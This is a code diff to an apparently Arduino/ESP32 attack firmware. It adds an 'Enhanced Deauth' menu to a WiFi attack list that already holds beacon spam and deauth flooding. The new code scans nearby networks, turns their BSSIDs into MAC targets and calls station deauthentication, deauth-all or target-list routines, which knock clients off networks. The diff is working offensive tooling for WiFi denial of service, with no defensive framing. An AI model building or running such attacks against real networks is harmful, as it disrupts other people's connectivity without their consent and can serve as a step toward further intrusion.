@@ -20,6 +20,7 @@
 #include <Arduino.h>
 #include <globals.h>
 #include <nvs_flash.h>
+#include "deauther.h"
 
 #define WIFI_ATK_NAME "BruceAttack"
 extern bool showHiddenNetworks;
@@ -285,6 +286,7 @@ void wifi_atk_menu() {
 #endif
         {"Beacon SPAM",  [=]() { beaconAttack(); }     },
         {"Deauth Flood", [=]() { deauthFloodAttack(); }},
+        {"Enhanced Deauth", [=]() { enhancedDeauthMenu(); }},
     };
     addOptionToMainMenu();
     loopOptions(options);
@@ -1074,4 +1076,100 @@ void beaconAttack() {
         }
     }
     wifi_atk_unsetWifi();
+}
+
+// ===== ENHANCED DEAUTH MENU FUNCTIONS =====
+void enhancedDeauthMenu() {
+    resetGlobalState();
+    
+    // Check if connected to WiFi
+    if (WiFi.status() != WL_CONNECTED) {
+        displayTextLine("Connecting to WiFi...");
+        if (!wifiConnecttoKnownNet()) {
+            displayError("Could not connect to WiFi", true);
+            delay(2000);
+            return;
+        }
+    }
+    
+    options = {
+        {"Station Deauth (Single)", [=]() {
+            showTargetSelection();
+        }},
+        {"Deauth All Clients", [=]() { 
+            deauthAll(); 
+        }},
+        {"Deauth Target List", [=]() {
+            std::vector<Host> targets = buildTargetListFromScan();
+            if (!targets.empty()) {
+                deauthTargetList(targets);
+            } else {
+                displayError("No targets found", true);
+            }
+        }},
+        {"Back", [=]() { returnToMenu = true; }},
+    };
+    addOptionToMainMenu();
+    loopOptions(options);
+}
+
+void showTargetSelection() {
+    drawMainBorderWithTitle("Select Target");
+    displayTextLine("Scanning for networks...");
+    
+    int n = WiFi.scanNetworks(false, true);
+    if (n == 0) {
+        displayError("No networks found", true);
+        return;
+    }
+    
+    std::vector<Option> targetOptions;
+    for (int i = 0; i < n; i++) {
+        String ssid = WiFi.SSID(i);
+        String bssid = WiFi.BSSIDstr(i);
+        int channel = WiFi.channel(i);
+        int rssi = WiFi.RSSI(i);
+        
+        String displayName = ssid.length() > 0 ? ssid : "<Hidden>";
+        String optionText = displayName + " (" + String(rssi) + "dBm|ch" + String(channel) + ")";
+        
+        targetOptions.push_back({optionText.c_str(), [=]() {
+            uint8_t mac[6];
+            sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+                   &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+            eth_addr eth;
+            memcpy(eth.addr, mac, 6);
+            
+            ip4_addr_t ip;
+            ip.addr = 0;
+            
+            Host target(&ip, &eth);
+            stationDeauth(target);
+        }});
+    }
+    targetOptions.push_back({"Back", []() { returnToMenu = true; }});
+    
+    loopOptions(targetOptions, MENU_TYPE_SUBMENU, "Select Target");
+}
+
+std::vector<Host> buildTargetListFromScan() {
+    std::vector<Host> targets;
+    int n = WiFi.scanNetworks(false, true);
+    
+    for (int i = 0; i < n; i++) {
+        String bssid = WiFi.BSSIDstr(i);
+        
+        uint8_t mac[6];
+        sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
+        eth_addr eth;
+        memcpy(eth.addr, mac, 6);
+        
+        ip4_addr_t ip;
+        ip.addr = 0;
+        
+        Host host(&ip, &eth);
+        targets.push_back(host);
+    }
+    return targets;
 }
